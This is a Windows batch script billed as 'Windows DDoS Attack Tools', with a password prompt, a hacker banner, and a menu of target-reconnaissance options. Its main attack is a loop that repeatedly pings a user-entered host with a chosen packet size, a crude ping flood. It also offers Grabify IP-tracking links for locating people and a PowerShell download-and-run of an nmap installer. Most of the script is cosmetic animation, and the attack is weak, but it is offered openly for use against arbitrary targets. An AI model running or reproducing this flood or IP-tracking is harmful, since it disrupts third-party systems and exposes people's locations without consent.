@echo off
mode 110,40
title Windows DDoS Attack Tools
cls
echo.
echo [40;32mWindows DDoS Attack tools
echo [40;32mCopyright ([40;37mC[40;32m) InCode, inc. All right reserved.
:login
echo.
echo [40;32mEnter your name and password "hack"
echo.
set /p name=[40;32mInput Your Name:[40;33m
set /p pass=[40;32mInput Password:[40;33m


if %pass%==hack (
goto NEXTY
) else (
goto wrong_password
)
pause

echo.
:wrong_password 
echo [40;31mThe Password is Wrong!
goto login
:NEXTY
echo [40;32mOk [40;33m%name%, [40;32mWelcome to tools DDoS Attack
echo.
echo Press enter to continue . . . 
pause>nul
cls
echo.
echo.
echo [40;32m------------------------------ [40;34mREMEMBER, DON'T DO IT FOR ILLEGAL THINGS [40;32m---------------------------
echo.
echo.
echo.
echo                    `                      
echo [40;34m                      +.`/`                 
echo [40;34m                .   `  yo-h:                    [DDoS[40;37m@[40;34mattack]
echo [40;34m          /+/omhomh+-smohh-                     [40;32m--------------------
echo [40;34m       :+oyNNNNNNNNNNNNNdmNy-                   [*][40;37mAuthor : ~ R.Code
echo [40;34m      `+mNNNmy++//+shmNNNNNNNh:                 [*][40;37mType : Ddos Attack         
echo [40;34m     -yNNNd:         `:ymNNNNmmh.               [*][40;37mTeam : InCode Team
echo [40;34m     :mNNN-             .sNNNmsdd-              [*][40;37mOperating System : %os%
echo [40;34m    `/hNNN`               :dNNNNNm-             [*][40;37mPC Name : %computername%
echo [40;34m      `mmNNy`                -odNNNo`           [*][40;37mUsername : %username%
echo [40;34m      `.:NNNd/                  :hNNmo-         [*][40;37mDate : %date%
echo [40;34m         o/ymNdo.                 oNNm:         [40;32m--------------------
echo [40;34m            `/ymNds:`             :h+.          [use this tool well]
echo [40;34m                -+sdNds/`                       [-][40;37mInfo Author :
echo [40;34m                    `:odmy:                     [+][40;37mContact : +62 821-7493-5446  
echo [40;34m                        .+dh.                   [+][40;37mEmail : rcode360@gmail.com
echo [40;34m                           /d-                  
echo [40;34m                            .h                    [41;37m  [46;37m  [43;37m  [44;37m  [45;37m  [44;37m  [47;37m  
echo [40;34m                             :            	[46;37m  [41;37m  [46;37m  [43;37m  [44;37m  [45;37m  [44;37m  [47;37m  
echo.
echo [40;32m__________________________________________________________________________________________________
echo [40;34m/ ____\ \   / /  _ \:  ____:  __ \   / ____:  ____/ ____: :  : :  __ \:_   _:__   __\ \   / /     /
echo [40;34m: :     \ \_/ /: :_) : :__  : :__) : : (___ : :__ : :    : :  : : :__) : : :    : :   \ \_/ /    /
echo [40;34m: :____   : :  : :_) : :____: : \ \   ____) : :___: :____: :__: : : \ \ _: :_   : :     : :     /
echo [40;34m\_____:  :_:  :____/:______:_:  \_\ :_____/:______\_____:\____/:_:  \_\_____:  :_:     :_:     /
echo. 
echo.                                                                                             
pause>nul 
goto NEXT

:NEXT     
echo Choice :
echo.
echo [40;32m----------------------------
echo [40;34m[1] [40;37mCheck Target Connection
echo [40;34m[2] [40;37mContinue Attack
echo [40;34m[3] [40;37mTracking IP by sending link
echo [40;34m[4] [40;37mZenmap / Nmap Download 
echo [40;34m[5] [40;37mNSLookup Target
echo [40;32m----------------------------
echo [40;34m[6] [40;37mDownload Kali Linux Virtual Box
echo [40;34m[7] [40;37mDownload Wireshark
echo [40;34m[8] [40;37mDownload Virtual Box
echo [40;32m----------------------------
echo [40;34m[0] [40;37mExit
echo [40;34m[Note] : [40;37mTo stop the attack press CTRL + C
set/p "input=Input Option:"
echo.
if %input%==1 goto check_connection
if %input%==2 goto continue
if %input%==3 start https://www.grabify.link
if %input%==4 goto nmap
if %input%==5 goto nslookup
if %input%==6 goto kali
if %input%==7 goto wireshark
if %input%==8 goto vb
if %input%==0 goto out

echo.

:check_connection
echo [40;34m[==================================]
echo [40;34m[[40;32m--------- [40;37mHost Target : [40;32m----------[40;34m]
echo [40;34m[==================================]
echo.
set /p x=[40;37mHost Target:
ping %x% -n 1 >nul
if errorlevel 1 (
    echo [40;31mTarget is Offline
    ping localhost -n 1 >nul 
    echo [40;31mTarget is Offline
    ping localhost -n 1 >nul 
    echo [40;31mTarget is Offline
    ping %x% -n 2
) else (
    echo [40;32mTarget is Online
    ping localhost -n 1 >nul 
    echo [40;32mTarget is Online
    ping localhost -n 1 >nul 
    echo [40;32mTarget is Online
    ping %x% -n 1
)

goto continue

:out
set /p confirmation1=Are you sure you want to exit this program (Y/N) ?
if %confirmation1%==y goto start
if %confirmation1%==n goto :NEXT
msg * Good By :)

:nslookup
:NSLOOKUP
SET TYPE=MX
echo [40;34m[==================================]
echo [40;34m[[40;32m--------- [40;37mHost Target : [40;32m----------[40;34m]
echo [40;34m[==================================]
echo.
set /p lookup=[40;37mIP Address / Website to lookup: 
nslookup %lookup%
pause
goto NEXT

:kali
start https://www.kali.org/get-kali/#kali-virtual-machines
pause
goto NEXT

:wireshark
start https://www.wireshark.org/download.html
pause
goto NEXT

:vb
start https://www.virtualbox.org/wiki/Downloads
pause
goto NEXT

:continue
echo [40;34m[==================================]
echo [40;34m[[40;32m---- [40;37mInput IP / Host Target : [40;32m----[40;34m]
echo [40;34m[==================================]
echo.
set /p m=[40;37mip Host:
echo.
echo [40;34m[==================================]
echo [40;34m[[40;32m---------- [40;37mInput Port : [40;32m----------[40;34m]
echo [40;34m[==================================]
echo.
set /p p=[40;37mport:
echo.
echo.
echo [40;34m[==========================================================]
echo [40;34m[[40;32m-- [40;37mEnter Packet / Packet Size to attack %m% : [40;32m--[40;34m]
echo [40;34m[==========================================================]
echo.
set /p n=[40;37mPacket Size:
echo.
:confirmation
set /p confirmation=[40;32mAre you sure you want to continue [40;34m([40;32mY[40;34m/[40;32mN[40;34m) [40;32m?
:scan
echo S
ping localhost -n 1 >nul
cls
echo Sc
ping localhost -n 1 >nul
cls
echo Sca
ping localhost -n 1 >nul
cls
echo Scan
ping localhost -n 1 >nul
cls
echo Scann
ping localhost -n 1 >nul
cls
echo Scanni
ping localhost -n 1 >nul
cls
echo Scannin 
ping localhost -n 1 >nul
cls
echo Scanning 
ping localhost -n 1 >nul
cls
echo Scanning S
ping localhost -n 1 >nul
cls
echo Scanning Se
ping localhost -n 1 >nul
cls
echo Scanning Ser
ping localhost -n 1 >nul
cls
echo Scanning Serv
ping localhost -n 1 >nul
cls
echo Scanning Serve
ping localhost -n 1 >nul
cls
echo Scanning Server
ping localhost -n 1 >nul
cls
echo Scanning Server.
ping localhost -n 1 >nul
cls
echo Scanning Server..
ping localhost -n 1 >nul
cls
echo Scanning Server...
ping localhost -n 1 >nul
cls
echo Scanning Server....
ping localhost -n 2 >nul
cls
echo Scanning Server...
ping localhost -n 1 >nul
cls
echo Scanning Server..
ping localhost -n 1 >nul
cls
echo Scanning Server.
ping localhost -n 1 >nul
cls
echo Scanning Server
ping localhost -n 1 >nul
cls
echo Scanning Serve
ping localhost -n 1 >nul
cls
echo Scanning Serv
ping localhost -n 1 >nul
cls
echo Scanning Ser
ping localhost -n 1 >nul
cls
echo Scanning Se
ping localhost -n 1 >nul
cls
echo Scanning S
ping localhost -n 1 >nul
cls
echo Scanning 
ping localhost -n 1 >nul
cls
echo Scanning
ping localhost -n 1 >nul
cls
echo Scannin
ping localhost -n 1 >nul
cls
echo Scanni
ping localhost -n 1 >nul
cls
echo Scann
ping localhost -n 1 >nul
cls
echo Scan
ping localhost -n 1 >nul
cls
echo Sca
ping localhost -n 1 >nul
cls
echo Sc
ping localhost -n 1 >nul
cls
echo S
ping localhost -n 1 >nul
cls
if %confirmation%==y goto :DDOS
if %confirmation%==n goto :NEXT
 
:nmap
cls
echo install nmap
powershell -Command "Invoke-WebRequest https://nmap.org/dist/nmap-7.80-setup.exe -OutFile nmap-7.80-setup.exe"
start nmap-7.80-setup.exe
echo type nmap to use
pause
goto start

:start
exit

:DDOS
@REM ping -n 1 %m% -l %n% | FIND "TTL="
@REM IF ERRORLEVEL 1 (SET in=c & echo No connection, server maybe down.)
@REM color %in%
@REM ping -t 2 0 10 127.0.0.1 >nul
ping %m% -l %n% -n 1 >nul
if errorlevel 1 (
    echo [40;31mNo Connection, Server maybe down
) else (
   echo [40;32m[%date%] [%time%] Attacking Server %m% {sent %n%}           [40;34m{--sent %n% #success--}
)
goto DDOS